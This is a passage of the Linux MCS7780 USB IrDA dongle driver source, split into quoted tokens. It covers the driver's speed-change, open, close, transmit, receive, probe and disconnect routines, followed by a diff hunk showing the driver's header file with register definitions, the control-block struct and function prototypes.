"*", "work", ")", "{", "struct", "mcs_cb", "*", "mcs", "=", "container_of", "(", "work", ",", "struct", "mcs_cb", ",", "work", ")", ";", "struct", "net_device", "*", "netdev", "=", "mcs", "-", ">", "netdev", ";", "mcs_speed_change", "(", "mcs", ")", ";", "netif_wake_queue", "(", "netdev", ")", ";", "}", "/", "*", "Function", "to", "change", "the", "speed", "of", "the", "mcs7780", ".", "Fully", "supports", "SIR", ",", "*", "MIR", ",", "and", "FIR", "speeds", ".", "*", "/", "static", "int", "mcs_speed_change", "(", "struct", "mcs_cb", "*", "mcs", ")", "{", "int", "ret", "=", "0", ";", "int", "rst", "=", "0", ";", "int", "cnt", "=", "0", ";", "__u16", "nspeed", ";", "__u16", "rval", ";", "nspeed", "=", "mcs_speed_set", "[", "(", "mcs", "-", ">", "new_speed", ">", ">", "8", ")", "&", "0x0f", "]", ";", "do", "{", "mcs_get_reg", "(", "mcs", ",", "MCS_RESV_REG", ",", "&", "rval", ")", ";", "}", "while", "(", "cnt", "+", "+", "<", "100", "&", "&", "(", "rval", "&", "MCS_IRINTX", ")", ");", "if", "(", "cnt", ">", "100", ")", "{", "net_err_ratelimited", "(", "\"", "unable", "to", "change", "speed", "\\", "n", "\"", ");", "ret", "=", "-", "EIO", ";", "goto", "error", ";", "}", "mcs_get_reg", "(", "mcs", ",", "MCS_MODE_REG", ",", "&", "rval", ")", ";", "/", "*", "MINRXPW", "values", "recommended", "by", "MosChip", "*", "/", "if", "(", "mcs", "-", ">", "new_speed", "<", "=", "115200", ")", "{", "rval", "&", "=", "~", "MCS_FIR", ";", "rst", "=", "mcs", "-", ">", "speed", ">", "115200", ";", "if", "(", "rst", ")", "mcs_set_reg", "(", "mcs", ",", "MCS_MINRXPW_REG", ",", "0", ")", ";", "}", "else", "if", "(", "mcs", "-", ">", "new_speed", "<", "=", "1152000", ")", "{", "rval", "&", "=", "~", "MCS_FIR", ";", "rst", "=", "!", "(", "mcs", "-", ">", "speed", "=", "=", "576000", "|", "|", "mcs", "-", ">", "speed", "=", "=", "1152000", ")", ";", "if", "(", "rst", ")", "mcs_set_reg", "(", "mcs", ",", "MCS_MINRXPW_REG", ",", "5", ")", ";", "}", "else", "{", "rval", "|", "=", "MCS_FIR", ";", "rst", "=", "mcs", "-", ">", "speed", "!", "=", "4000000", ";", "if", "(", "rst", ")", "mcs_set_reg", "(", "mcs", ",", "MCS_MINRXPW_REG", ",", "5", ")", ";", "}", "rval", "&", "=", "~", "MCS_SPEED_MASK", ";", "rval", "|", "=", "nspeed", ";", "ret", "=", "mcs_set_reg", "(", "mcs", ",", "MCS_MODE_REG", ",", "rval", ")", ";", "if", "(", "unlikely", "(", "ret", ")", ")", "goto", "error", ";", "if", "(", "rst", ")", "switch", "(", "mcs", "-", ">", "transceiver_type", ")", "{", "case", "MCS_TSC_VISHAY", ":", "ret", "=", "mcs_setup_transceiver_vishay", "(", "mcs", ")", ";", "break", ";", "case", "MCS_TSC_SHARP", ":", "ret", "=", "mcs_setup_transceiver_sharp", "(", "mcs", ")", ";", "break", ";", "case", "MCS_TSC_AGILENT", ":", "ret", "=", "mcs_setup_transceiver_agilent", "(", "mcs", ")", ";", "break", ";", "default", ":", "ret", "=", "1", ";", "net_warn_ratelimited", "(", "\"", "Unknown", "transceiver", "type", ":", "%", "d", "\\", "n", "\"", ",", "mcs", "-", ">", "transceiver_type", ")", ";", "}", "if", "(", "unlikely", "(", "ret", ")", ")", "goto", "error", ";", "mcs_get_reg", "(", "mcs", ",", "MCS_MODE_REG", ",", "&", "rval", ")", ";", "rval", "&", "=", "~", "MCS_RESET", ";", "ret", "=", "mcs_set_reg", "(", "mcs", ",", "MCS_MODE_REG", ",", "rval", ")", ";", "mcs", "-", ">", "speed", "=", "mcs", "-", ">", "new_speed", ";", "error", ":", "mcs", "-", ">", "new_speed", "=", "0", ";", "return", "ret", ";", "}", "/", "*", "Ioctl", "calls", "not", "supported", "at", "this", "time", ".", "Can", "be", "an", "area", "of", "future", "work", ".", "*", "/", "static", "int", "mcs_net_ioctl", "(", "struct", "net_device", "*", "netdev", ",", "struct", "ifreq", "*", "rq", ",", "int", "cmd", ")", "{", "/", "*", "struct", "if_irda_req", "*", "irq", "=", "(", "struct", "if_irda_req", "*", ")", "rq", ";", "*", "/", "/", "*", "struct", "mcs_cb", "*", "mcs", "=", "netdev_priv", "(", "netdev", ")", ";", "*", "/", "int", "ret", "=", "0", ";", "switch", "(", "cmd", ")", "{", "default", ":", "ret", "=", "-", "EOPNOTSUPP", ";", "}", "return", "ret", ";", "}", "/", "*", "Network", "device", "is", "taken", "down", ",", "done", "by", "\"", "ifconfig", "irda0", "down", "\"", "*", "/", "static", "int", "mcs_net_close", "(", "struct", "net_device", "*", "netdev", ")", "{", "int", "ret", "=", "0", ";", "struct", "mcs_cb", "*", "mcs", "=", "netdev_priv", "(", "netdev", ")", ";", "/", "*", "Stop", "transmit", "processing", "*", "/", "netif_stop_queue", "(", "netdev", ")", ";", "kfree_skb", "(", "mcs", "-", ">", "rx_buff", ".", "skb", ")", ";", "/", "*", "kill", "and", "free", "the", "receive", "and", "transmit", "URBs", "*", "/", "usb_kill_urb", "(", "mcs", "-", ">", "rx_urb", ")", ";", "usb_free_urb", "(", "mcs", "-", ">", "rx_urb", ")", ";", "usb_kill_urb", "(", "mcs", "-", ">", "tx_urb", ")", ";", "usb_free_urb", "(", "mcs", "-", ">", "tx_urb", ")", ";", "/", "*", "Stop", "and", "remove", "instance", "of", "IrLAP", "*", "/", "if", "(", "mcs", "-", ">", "irlap", ")", "irlap_close", "(", "mcs", "-", ">", "irlap", ")", ";", "mcs", "-", ">", "irlap", "=", "NULL", ";", "return", "ret", ";", "}", "/", "*", "Network", "device", "is", "taken", "up", ",", "done", "by", "\"", "ifconfig", "irda0", "up", "\"", "*", "/", "static", "int", "mcs_net_open", "(", "struct", "net_device", "*", "netdev", ")", "{", "struct", "mcs_cb", "*", "mcs", "=", "netdev_priv", "(", "netdev", ")", ";", "char", "hwname", "[", "16", "]", ";", "int", "ret", "=", "0", ";", "ret", "=", "usb_clear_halt", "(", "mcs", "-", ">", "usbdev", ",", "usb_sndbulkpipe", "(", "mcs", "-", ">", "usbdev", ",", "mcs", "-", ">", "ep_in", ")", ");", "if", "(", "ret", ")", "goto", "error1", ";", "ret", "=", "usb_clear_halt", "(", "mcs", "-", ">", "usbdev", ",", "usb_rcvbulkpipe", "(", "mcs", "-", ">", "usbdev", ",", "mcs", "-", ">", "ep_out", ")", ");", "if", "(", "ret", ")", "goto", "error1", ";", "ret", "=", "mcs_setup_transceiver", "(", "mcs", ")", ";", "if", "(", "ret", ")", "goto", "error1", ";", "ret", "=", "-", "ENOMEM", ";", "/", "*", "Initialize", "for", "SIR", "/", "FIR", "to", "copy", "data", "directly", "into", "skb", ".", "*", "/", "mcs", "-", ">", "receiving", "=", "0", ";", "mcs", "-", ">", "rx_buff", ".", "truesize", "=", "IRDA_SKB_MAX_MTU", ";", "mcs", "-", ">", "rx_buff", ".", "skb", "=", "dev_alloc_skb", "(", "IRDA_SKB_MAX_MTU", ")", ";", "if", "(", "!", "mcs", "-", ">", "rx_buff", ".", "skb", ")", "goto", "error1", ";", "skb_reserve", "(", "mcs", "-", ">", "rx_buff", ".", "skb", ",", "1", ")", ";", "mcs", "-", ">", "rx_buff", ".", "head", "=", "mcs", "-", ">", "rx_buff", ".", "skb", "-", ">", "data", ";", "/", "*", "*", "Now", "that", "everything", "should", "be", "initialized", "properly", ",", "*", "Open", "new", "IrLAP", "layer", "instance", "to", "take", "care", "of", "us", ".", "..", "*", "Note", ":", "will", "send", "immediately", "a", "speed", "change", ".", "..", "*", "/", "sprintf", "(", "hwname", ",", "\"", "usb", "#", "%", "d", "\"", ",", "mcs", "-", ">", "usbdev", "-", ">", "devnum", ")", ";", "mcs", "-", ">", "irlap", "=", "irlap_open", "(", "netdev", ",", "&", "mcs", "-", ">", "qos", ",", "hwname", ")", ";", "if", "(", "!", "mcs", "-", ">", "irlap", ")", "{", "net_err_ratelimited", "(", "\"", "mcs7780", ":", "irlap_open", "failed", "\\", "n", "\"", ");", "goto", "error2", ";", "}", "if", "(", "!", "mcs_setup_urbs", "(", "mcs", ")", ")", "goto", "error3", ";", "ret", "=", "mcs_receive_start", "(", "mcs", ")", ";", "if", "(", "ret", ")", "goto", "error4", ";", "netif_start_queue", "(", "netdev", ")", ";", "return", "0", ";", "error4", ":", "usb_free_urb", "(", "mcs", "-", ">", "rx_urb", ")", ";", "usb_free_urb", "(", "mcs", "-", ">", "tx_urb", ")", ";", "error3", ":", "irlap_close", "(", "mcs", "-", ">", "irlap", ")", ";", "error2", ":", "kfree_skb", "(", "mcs", "-", ">", "rx_buff", ".", "skb", ")", ";", "error1", ":", "return", "ret", ";", "}", "/", "*", "Receive", "callback", "function", ".", "*", "/", "static", "void", "mcs_receive_irq", "(", "struct", "urb", "*", "urb", ")", "{", "__u8", "*", "bytes", ";", "struct", "mcs_cb", "*", "mcs", "=", "urb", "-", ">", "context", ";", "int", "i", ";", "int", "ret", ";", "if", "(", "!", "netif_running", "(", "mcs", "-", ">", "netdev", ")", ")", "return", ";", "if", "(", "urb", "-", ">", "status", ")", "return", ";", "if", "(", "urb", "-", ">", "actual_length", ">", "0", ")", "{", "bytes", "=", "urb", "-", ">", "transfer_buffer", ";", "/", "*", "MCS", "returns", "frames", "without", "BOF", "and", "EOF", "*", "I", "assume", "it", "returns", "whole", "frames", ".", "*", "/", "/", "*", "SIR", "speed", "*", "/", "if", "(", "mcs", "-", ">", "speed", "<", "576000", ")", "{", "async_unwrap_char", "(", "mcs", "-", ">", "netdev", ",", "&", "mcs", "-", ">", "netdev", "-", ">", "stats", ",", "&", "mcs", "-", ">", "rx_buff", ",", "0xc0", ")", ";", "for", "(", "i", "=", "0", ";", "i", "<", "urb", "-", ">", "actual_length", ";", "i", "+", "+)", "async_unwrap_char", "(", "mcs", "-", ">", "netdev", ",", "&", "mcs", "-", ">", "netdev", "-", ">", "stats", ",", "&", "mcs", "-", ">", "rx_buff", ",", "bytes", "[", "i", "]", ");", "async_unwrap_char", "(", "mcs", "-", ">", "netdev", ",", "&", "mcs", "-", ">", "netdev", "-", ">", "stats", ",", "&", "mcs", "-", ">", "rx_buff", ",", "0xc1", ")", ";", "}", "/", "*", "MIR", "speed", "*", "/", "else", "if", "(", "mcs", "-", ">", "speed", "=", "=", "576000", "|", "|", "mcs", "-", ">", "speed", "=", "=", "1152000", ")", "{", "mcs_unwrap_mir", "(", "mcs", ",", "urb", "-", ">", "transfer_buffer", ",", "urb", "-", ">", "actual_length", ")", ";", "}", "/", "*", "FIR", "speed", "*", "/", "else", "{", "mcs_unwrap_fir", "(", "mcs", ",", "urb", "-", ">", "transfer_buffer", ",", "urb", "-", ">", "actual_length", ")", ";", "}", "}", "ret", "=", "usb_submit_urb", "(", "urb", ",", "GFP_ATOMIC", ")", ";", "}", "/", "*", "Transmit", "callback", "function", ".", "*", "/", "static", "void", "mcs_send_irq", "(", "struct", "urb", "*", "urb", ")", "{", "struct", "mcs_cb", "*", "mcs", "=", "urb", "-", ">", "context", ";", "struct", "net_device", "*", "ndev", "=", "mcs", "-", ">", "netdev", ";", "if", "(", "unlikely", "(", "mcs", "-", ">", "new_speed", ")", ")", "schedule_work", "(", "&", "mcs", "-", ">", "work", ")", ";", "else", "netif_wake_queue", "(", "ndev", ")", ";", "}", "/", "*", "Transmit", "callback", "function", ".", "*", "/", "static", "netdev_tx_t", "mcs_hard_xmit", "(", "struct", "sk_buff", "*", "skb", ",", "struct", "net_device", "*", "ndev", ")", "{", "unsigned", "long", "flags", ";", "struct", "mcs_cb", "*", "mcs", ";", "int", "wraplen", ";", "int", "ret", "=", "0", ";", "netif_stop_queue", "(", "ndev", ")", ";", "mcs", "=", "netdev_priv", "(", "ndev", ")", ";", "spin_lock_irqsave", "(", "&", "mcs", "-", ">", "lock", ",", "flags", ")", ";", "mcs", "-", ">", "new_speed", "=", "irda_get_next_speed", "(", "skb", ")", ";", "if", "(", "likely", "(", "mcs", "-", ">", "new_speed", "=", "=", "mcs", "-", ">", "speed", ")", ")", "mcs", "-", ">", "new_speed", "=", "0", ";", "/", "*", "SIR", "speed", "*", "/", "if", "(", "mcs", "-", ">", "speed", "<", "576000", ")", "{", "wraplen", "=", "mcs_wrap_sir_skb", "(", "skb", ",", "mcs", "-", ">", "out_buf", ")", ";", "}", "/", "*", "MIR", "speed", "*", "/", "else", "if", "(", "mcs", "-", ">", "speed", "=", "=", "576000", "|", "|", "mcs", "-", ">", "speed", "=", "=", "1152000", ")", "{", "wraplen", "=", "mcs_wrap_mir_skb", "(", "skb", ",", "mcs", "-", ">", "out_buf", ")", ";", "}", "/", "*", "FIR", "speed", "*", "/", "else", "{", "wraplen", "=", "mcs_wrap_fir_skb", "(", "skb", ",", "mcs", "-", ">", "out_buf", ")", ";", "}", "usb_fill_bulk_urb", "(", "mcs", "-", ">", "tx_urb", ",", "mcs", "-", ">", "usbdev", ",", "usb_sndbulkpipe", "(", "mcs", "-", ">", "usbdev", ",", "mcs", "-", ">", "ep_out", ")", ",", "mcs", "-", ">", "out_buf", ",", "wraplen", ",", "mcs_send_irq", ",", "mcs", ")", ";", "if", "(", "(", "ret", "=", "usb_submit_urb", "(", "mcs", "-", ">", "tx_urb", ",", "GFP_ATOMIC", ")", "))", "{", "net_err_ratelimited", "(", "\"", "failed", "tx_urb", ":", "%", "d", "\\", "n", "\"", ",", "ret", ")", ";", "switch", "(", "ret", ")", "{", "case", "-", "ENODEV", ":", "case", "-", "EPIPE", ":", "break", ";", "default", ":", "mcs", "-", ">", "netdev", "-", ">", "stats", ".", "tx_errors", "+", "+;", "netif_start_queue", "(", "ndev", ")", ";", "}", "}", "else", "{", "mcs", "-", ">", "netdev", "-", ">", "stats", ".", "tx_packets", "+", "+;", "mcs", "-", ">", "netdev", "-", ">", "stats", ".", "tx_bytes", "+", "=", "skb", "-", ">", "len", ";", "}", "dev_kfree_skb", "(", "skb", ")", ";", "spin_unlock_irqrestore", "(", "&", "mcs", "-", ">", "lock", ",", "flags", ")", ";", "return", "NETDEV_TX_OK", ";", "}", "static", "const", "struct", "net_device_ops", "mcs_netdev_ops", "=", "{", ".", "ndo_open", "=", "mcs_net_open", ",", ".", "ndo_stop", "=", "mcs_net_close", ",", ".", "ndo_start_xmit", "=", "mcs_hard_xmit", ",", ".", "ndo_do_ioctl", "=", "mcs_net_ioctl", ",", "}", ";", "/", "*", "*", "This", "function", "is", "called", "by", "the", "USB", "subsystem", "for", "each", "new", "device", "in", "the", "*", "system", ".", "Need", "to", "verify", "the", "device", "and", "if", "it", "is", ",", "then", "start", "handling", "it", ".", "*", "/", "static", "int", "mcs_probe", "(", "struct", "usb_interface", "*", "intf", ",", "const", "struct", "usb_device_id", "*", "id", ")", "{", "struct", "usb_device", "*", "udev", "=", "interface_to_usbdev", "(", "intf", ")", ";", "struct", "net_device", "*", "ndev", "=", "NULL", ";", "struct", "mcs_cb", "*", "mcs", ";", "int", "ret", "=", "-", "ENOMEM", ";", "ndev", "=", "alloc_irdadev", "(", "sizeof", "(", "*", "mcs", ")", ");", "if", "(", "!", "ndev", ")", "goto", "error1", ";", "pr_debug", "(", "\"", "MCS7780", "USB", "-", "IrDA", "bridge", "found", "at", "%", "d", ".", "\\", "n", "\"", ",", "udev", "-", ">", "devnum", ")", ";", "SET_NETDEV_DEV", "(", "ndev", ",", "&", "intf", "-", ">", "dev", ")", ";", "ret", "=", "usb_reset_configuration", "(", "udev", ")", ";", "if", "(", "ret", "!", "=", "0", ")", "{", "net_err_ratelimited", "(", "\"", "mcs7780", ":", "usb", "reset", "configuration", "failed", "\\", "n", "\"", ");", "goto", "error2", ";", "}", "mcs", "=", "netdev_priv", "(", "ndev", ")", ";", "mcs", "-", ">", "usbdev", "=", "udev", ";", "mcs", "-", ">", "netdev", "=", "ndev", ";", "spin_lock_init", "(", "&", "mcs", "-", ">", "lock", ")", ";", "/", "*", "Initialize", "QoS", "for", "this", "device", "*", "/", "irda_init_max_qos_capabilies", "(", "&", "mcs", "-", ">", "qos", ")", ";", "/", "*", "That", "'", "s", "the", "Rx", "capability", ".", "*", "/", "mcs", "-", ">", "qos", ".", "baud_rate", ".", "bits", "&", "=", "IR_2400", "|", "IR_9600", "|", "IR_19200", "|", "IR_38400", "|", "IR_57600", "|", "IR_115200", "|", "IR_576000", "|", "IR_1152000", "|", "(", "IR_4000000", "<", "<", "8", ")", ";", "mcs", "-", ">", "qos", ".", "min_turn_time", ".", "bits", "&", "=", "qos_mtt_bits", ";", "irda_qos_bits_to_value", "(", "&", "mcs", "-", ">", "qos", ")", ";", "/", "*", "Speed", "change", "work", "initialisation", "*", "/", "INIT_WORK", "(", "&", "mcs", "-", ">", "work", ",", "mcs_speed_work", ")", ";", "ndev", "-", ">", "netdev_ops", "=", "&", "mcs_netdev_ops", ";", "if", "(", "!", "intf", "-", ">", "cur_altsetting", ")", "{", "ret", "=", "-", "ENOMEM", ";", "goto", "error2", ";", "}", "ret", "=", "mcs_find_endpoints", "(", "mcs", ",", "intf", "-", ">", "cur_altsetting", "-", ">", "endpoint", ",", "intf", "-", ">", "cur_altsetting", "-", ">", "desc", ".", "bNumEndpoints", ")", ";", "if", "(", "!", "ret", ")", "{", "ret", "=", "-", "ENODEV", ";", "goto", "error2", ";", "}", "ret", "=", "register_netdev", "(", "ndev", ")", ";", "if", "(", "ret", "!", "=", "0", ")", "goto", "error2", ";", "pr_debug", "(", "\"", "IrDA", ":", "Registered", "MosChip", "MCS7780", "device", "as", "%", "s", "\\", "n", "\"", ",", "ndev", "-", ">", "name", ")", ";", "mcs", "-", ">", "transceiver_type", "=", "transceiver_type", ";", "mcs", "-", ">", "sir_tweak", "=", "sir_tweak", ";", "mcs", "-", ">", "receive_mode", "=", "receive_mode", ";", "usb_set_intfdata", "(", "intf", ",", "mcs", ")", ";", "return", "0", ";", "error2", ":", "free_netdev", "(", "ndev", ")", ";", "error1", ":", "return", "ret", ";", "}", "/", "*", "The", "current", "device", "is", "removed", ",", "the", "USB", "layer", "tells", "us", "to", "shut", "down", ".", "*", "/", "static", "void", "mcs_disconnect", "(", "struct", "usb_interface", "*", "intf", ")", "{", "struct", "mcs_cb", "*", "mcs", "=", "usb_get_intfdata", "(", "intf", ")", ";", "if", "(", "!", "mcs", ")", "return", ";", "cancel_work_sync", "(", "&", "mcs", "-", ">", "work", ")", ";", "unregister_netdev", "(", "mcs", "-", ">", "netdev", ")", ";", "free_netdev", "(", "mcs", "-", ">", "netdev", ")", ";", "usb_set_intfdata", "(", "intf", ",", "NULL", ")", ";", "pr_debug", "(", "\"", "MCS7780", "now", "disconnected", ".", "\\", "n", "\"", ");", "}", "module_usb_driver", "(", "mcs_driver", ")", ";", "@", "@", "-", "1", ",", "165", "+", "0", ",", "0", "@", "@", "/", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*", "*", "*", "Filename", ":", "mcs7780", ".", "h", "*", "Version", ":", "0", ".", "2", "-", "alpha", "*", "Description", ":", "Irda", "MosChip", "USB", "Dongle", "*", "Status", ":", "Experimental", "*", "Authors", ":", "Lukasz", "Stelmach", "<", "stlman", "@", "poczta", ".", "fm", ">", "*", "Brian", "Pugh", "<", "bpugh", "@", "cs", ".", "pdx", ".", "edu", ">", "*", "*", "Copyright", "(", "C", ")", "2005", ",", "Lukasz", "Stelmach", "<", "stlman", "@", "poczta", ".", "fm", ">", "*", "Copyright", "(", "C", ")", "2005", ",", "Brian", "Pugh", "<", "bpugh", "@", "cs", ".", "pdx", ".", "edu", ">", "*", "*", "This", "program", "is", "free", "software", ";", "you", "can", "redistribute", "it", "and", "/", "or", "modify", "*", "it", "under", "the", "terms", "of", "the", "GNU", "General", "Public", "License", "as", "published", "by", "*", "the", "Free", "Software", "Foundation", ";", "either", "version", "2", "of", "the", "License", ",", "or", "*", "(", "at", "your", "option", ")", "any", "later", "version", ".", "*", "*", "This", "program", "is", "distributed", "in", "the", "hope", "that", "it", "will", "be", "useful", ",", "*", "but", "WITHOUT", "ANY", "WARRANTY", ";", "without", "even", "the", "implied", "warranty", "of", "*", "MERCHANTABILITY", "or", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", ".", "See", "the", "*", "GNU", "General", "Public", "License", "for", "more", "details", ".", "*", "*", "You", "should", "have", "received", "a", "copy", "of", "the", "GNU", "General", "Public", "License", "*", "along", "with", "this", "program", ";", "if", "not", ",", "write", "to", "the", "Free", "Software", "*", "Foundation", ",", "Inc", ".", ",", "675", "Mass", "Ave", ",", "Cambridge", ",", "MA", "02139", ",", "USA", ".", "*", "*", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "/", "#", "ifndef", "_MCS7780_H", "#", "define", "_MCS7780_H", "#", "define", "MCS_MODE_SIR", "0", "#", "define", "MCS_MODE_MIR", "1", "#", "define", "MCS_MODE_FIR", "2", "#", "define", "MCS_CTRL_TIMEOUT", "500", "#", "define", "MCS_XMIT_TIMEOUT", "500", "/", "*", "Possible", "transceiver", "types", "*", "/", "#", "define", "MCS_TSC_VISHAY", "0", "/", "*", "Vishay", "TFD", ",", "default", "choice", "*", "/", "#", "define", "MCS_TSC_AGILENT", "1", "/", "*", "Agilent", "3602", "/", "3600", "*", "/", "#", "define", "MCS_TSC_SHARP", "2", "/", "*", "Sharp", "GP2W1000YP", "*", "/", "/", "*", "Requests", "*", "/", "#", "define", "MCS_RD_RTYPE", "0xC0", "#", "define", "MCS_WR_RTYPE", "0x40", "#", "define", "MCS_RDREQ", "0x0F", "#", "define", "MCS_WRREQ", "0x0E", "/", "*", "Register", "0x00", "*", "/", "#", "define", "MCS_MODE_REG", "0", "#", "define", "MCS_FIR", "(", "(", "__u16", ")", "0x0001", ")", "#", "define", "MCS_SIR16US", "(", "(", "__u16", ")", "0x0002", ")", "#", "define", "MCS_BBTG", "(", "(", "__u16", ")", "0x0004", ")", "#", "define", "MCS_ASK", "(", "(", "__u16", ")", "0x0008", ")", "#", "define", "MCS_PARITY", "(", "(", "__u16", ")", "0x0010", ")", "/", "*", "SIR", "/", "MIR", "speed", "constants", "*", "/", "#", "define", "MCS_SPEED_SHIFT", "5", "#", "define", "MCS_SPEED_MASK", "(", "(", "__u16", ")", "0x00E0", ")", "#", "define", "MCS_SPEED", "(", "x", ")", "(", "(", "x", "&", "MCS_SPEED_MASK", ")", ">", ">", "MCS_SPEED_SHIFT", ")", "#", "define", "MCS_SPEED_2400", "(", "(", "0", "<", "<", "MCS_SPEED_SHIFT", ")", "&", "MCS_SPEED_MASK", ")", "#", "define", "MCS_SPEED_9600", "(", "(", "1", "<", "<", "MCS_SPEED_SHIFT", ")", "&", "MCS_SPEED_MASK", ")", "#", "define", "MCS_SPEED_19200", "(", "(", "2", "<", "<", "MCS_SPEED_SHIFT", ")", "&", "MCS_SPEED_MASK", ")", "#", "define", "MCS_SPEED_38400", "(", "(", "3", "<", "<", "MCS_SPEED_SHIFT", ")", "&", "MCS_SPEED_MASK", ")", "#", "define", "MCS_SPEED_57600", "(", "(", "4", "<", "<", "MCS_SPEED_SHIFT", ")", "&", "MCS_SPEED_MASK", ")", "#", "define", "MCS_SPEED_115200", "(", "(", "5", "<", "<", "MCS_SPEED_SHIFT", ")", "&", "MCS_SPEED_MASK", ")", "#", "define", "MCS_SPEED_576000", "(", "(", "6", "<", "<", "MCS_SPEED_SHIFT", ")", "&", "MCS_SPEED_MASK", ")", "#", "define", "MCS_SPEED_1152000", "(", "(", "7", "<", "<", "MCS_SPEED_SHIFT", ")", "&", "MCS_SPEED_MASK", ")", "#", "define", "MCS_PLLPWDN", "(", "(", "__u16", ")", "0x0100", ")", "#", "define", "MCS_DRIVER", "(", "(", "__u16", ")", "0x0200", ")", "#", "define", "MCS_DTD", "(", "(", "__u16", ")", "0x0400", ")", "#", "define", "MCS_DIR", "(", "(", "__u16", ")", "0x0800", ")", "#", "define", "MCS_SIPEN", "(", "(", "__u16", ")", "0x1000", ")", "#", "define", "MCS_SENDSIP", "(", "(", "__u16", ")", "0x2000", ")", "#", "define", "MCS_CHGDIR", "(", "(", "__u16", ")", "0x4000", ")", "#", "define", "MCS_RESET", "(", "(", "__u16", ")", "0x8000", ")", "/", "*", "Register", "0x02", "*", "/", "#", "define", "MCS_XCVR_REG", "2", "#", "define", "MCS_MODE0", "(", "(", "__u16", ")", "0x0001", ")", "#", "define", "MCS_STFIR", "(", "(", "__u16", ")", "0x0002", ")", "#", "define", "MCS_XCVR_CONF", "(", "(", "__u16", ")", "0x0004", ")", "#", "define", "MCS_RXFAST", "(", "(", "__u16", ")", "0x0008", ")", "/", "*", "TXCUR", "[", "6", ":", "4", "]", "*", "/", "#", "define", "MCS_TXCUR_SHIFT", "4", "#", "define", "MCS_TXCUR_MASK", "(", "(", "__u16", ")", "0x0070", ")", "#", "define", "MCS_TXCUR", "(", "x", ")", "(", "(", "x", "&", "MCS_TXCUR_MASK", ")", ">", ">", "MCS_TXCUR_SHIFT", ")", "#", "define", "MCS_SETTXCUR", "(", "x", ",", "y", ")", "\\", "(", "(", "x", "&", "~", "MCS_TXCUR_MASK", ")", "|", "(", "y", "<", "<", "MCS_TXCUR_SHIFT", ")", "&", "MCS_TXCUR_MASK", ")", "#", "define", "MCS_MODE1", "(", "(", "__u16", ")", "0x0080", ")", "#", "define", "MCS_SMODE0", "(", "(", "__u16", ")", "0x0100", ")", "#", "define", "MCS_SMODE1", "(", "(", "__u16", ")", "0x0200", ")", "#", "define", "MCS_INVTX", "(", "(", "__u16", ")", "0x0400", ")", "#", "define", "MCS_INVRX", "(", "(", "__u16", ")", "0x0800", ")", "#", "define", "MCS_MINRXPW_REG", "4", "#", "define", "MCS_RESV_REG", "7", "#", "define", "MCS_IRINTX", "(", "(", "__u16", ")", "0x0001", ")", "#", "define", "MCS_IRINRX", "(", "(", "__u16", ")", "0x0002", ")", "struct", "mcs_cb", "{", "struct", "usb_device", "*", "usbdev", ";", "/", "*", "init", ":", "probe_irda", "*", "/", "struct", "net_device", "*", "netdev", ";", "/", "*", "network", "layer", "*", "/", "struct", "irlap_cb", "*", "irlap", ";", "/", "*", "The", "link", "layer", "we", "are", "binded", "to", "*", "/", "struct", "qos_info", "qos", ";", "unsigned", "int", "speed", ";", "/", "*", "Current", "speed", "*", "/", "unsigned", "int", "new_speed", ";", "/", "*", "new", "speed", "*", "/", "struct", "work_struct", "work", ";", "/", "*", "Change", "speed", "work", "*", "/", "struct", "sk_buff", "*", "tx_pending", ";", "char", "in_buf", "[", "4096", "]", ";", "/", "*", "transmit", "/", "receive", "buffer", "*", "/", "char", "out_buf", "[", "4096", "]", ";", "/", "*", "transmit", "/", "receive", "buffer", "*", "/", "__u8", "*", "fifo_status", ";", "iobuff_t", "rx_buff", ";", "/", "*", "receive", "unwrap", "state", "machine", "*", "/", "spinlock_t", "lock", ";", "int", "receiving", ";", "__u8", "ep_in", ";", "__u8", "ep_out", ";", "struct", "urb", "*", "rx_urb", ";", "struct", "urb", "*", "tx_urb", ";", "int", "transceiver_type", ";", "int", "sir_tweak", ";", "int", "receive_mode", ";", "}", ";", "static", "int", "mcs_set_reg", "(", "struct", "mcs_cb", "*", "mcs", ",", "__u16", "reg", ",", "__u16", "val", ")", ";", "static", "int", "mcs_get_reg", "(", "struct", "mcs_cb", "*", "mcs", ",", "__u16", "reg", ",", "__u16", "*", "val", ")", ";", "static", "inline", "int", "mcs_setup_transceiver_vishay", "(", "struct", "mcs_cb", "*", "mcs", ")", ";", "static", "inline", "int", "mcs_setup_transceiver_agilent", "(", "struct", "mcs_cb", "*", "mcs", ")", ";", "static", "inline", "int", "mcs_setup_transceiver_sharp", "(", "struct", "mcs_cb", "*", "mcs", ")", ";", "static", "inline", "int", "mcs_setup_transceiver", "(", "struct", "mcs_cb", "*", "mcs", ")", ";", "static", "inline", "int", "mcs_wrap_sir_skb", "(", "struct", "sk_buff", "*", "skb", ",", "__u8", "*", "buf", ")", ";", "static", "unsigned", "mcs_wrap_fir_skb", "(", "const", "struct", "sk_buff", "*", "skb", ",", "__u8", "*", "buf", ")", ";", "static", "unsigned", "mcs_wrap_mir_skb", "(", "const", "struct", "sk_buff", "*", "skb", ",", "__u8", "*", "buf", ")", ";", "static", "void", "mcs_unwrap_mir", "(", "struct", "mcs_cb", "*", "mcs", ",", "__u8", "*", "buf", ",", "int", "len", ")", ";", "static", "void", "mcs_unwrap_fir", "(", "struct", "mcs_cb", "*", "mcs", ",", "__u8", "*", "buf", ",", "int", "len", ")", ";", "static", "inline", "int", "mcs_setup_urbs", "(", "struct", "mcs_cb", "*", "mcs", ")", ";", "static", "inline", "int", "mcs_receive_start", "(", "struct", "mcs_cb", "*", "mcs", ")", ";", "static", "inline", "int", "mcs_find_endpoints", "(", "struct", "mcs_cb", "*", "mcs", ",", "struct", "usb_host_endpoint", "*", "ep", ",", "int", "epnum", ")", ";", "static", "int", "mcs_speed_change", "(", "struct", "mcs_cb", "*", "mcs", ")", ";", "static", "int", "mcs_net_ioctl", "(", "struct", "net_device", "*", "netdev", ",", "struct", "ifreq", "*", "rq", ",", "int", "cmd", ")", ";", "static", "int", "mcs_net_close", "(", "struct", "net_device", "*", "netdev", ")", ";", "static", "int", "mcs_net_open", "(", "struct", "net_device", "*", "netdev", ")", ";", "static", "void", "mcs_receive_irq", "(", "struct", "urb", "*", "urb", 